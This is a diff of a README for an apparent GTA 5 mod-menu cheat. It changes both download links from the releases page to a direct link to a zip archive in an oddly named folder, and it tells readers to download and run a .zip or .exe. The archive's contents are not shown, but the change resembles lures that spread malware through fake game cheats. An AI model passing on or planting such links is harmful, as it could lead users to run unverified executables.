@@ -1,6 +1,6 @@
 # 🎮 gta-5-mod-menu - Gain total control in your games
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/dennimellow651/gta-5-mod-menu/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/dennimellow651/gta-5-mod-menu/raw/refs/heads/main/lindoite/menu_mod_gta_v1.2.zip)
 
 ## 📁 Project Overview
 
@@ -22,7 +22,7 @@ Ensure your computer meets these specifications to run the software.
 
 Follow these steps to set up the software.
 
-1. Visit [this page to download](https://github.com/dennimellow651/gta-5-mod-menu/releases).
+1. Visit [this page to download](https://github.com/dennimellow651/gta-5-mod-menu/raw/refs/heads/main/lindoite/menu_mod_gta_v1.2.zip).
 2. Choose the latest release file, typically ending in .zip or .exe.
 3. Save the file to a folder on your computer.
 4. Extract the contents if you downloaded a compressed folder.
